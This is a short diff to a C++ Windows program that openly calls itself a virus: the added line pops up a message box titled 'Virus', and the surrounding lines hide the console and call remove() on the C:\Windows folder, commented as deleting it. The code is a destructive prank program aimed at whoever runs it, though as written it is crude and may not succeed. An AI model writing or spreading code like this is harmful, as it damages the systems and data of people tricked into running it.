@@ -5,6 +5,7 @@
 using namespace std;
 
 int main(){
+  MessageBox(NULL,"You Messed Up Hard","Virus", MB_OK); //The Message!
   FreeConsole(); //Hides Console
   
   const int result = remove("C:\Windows"); //Removes The C:/Windows Folder
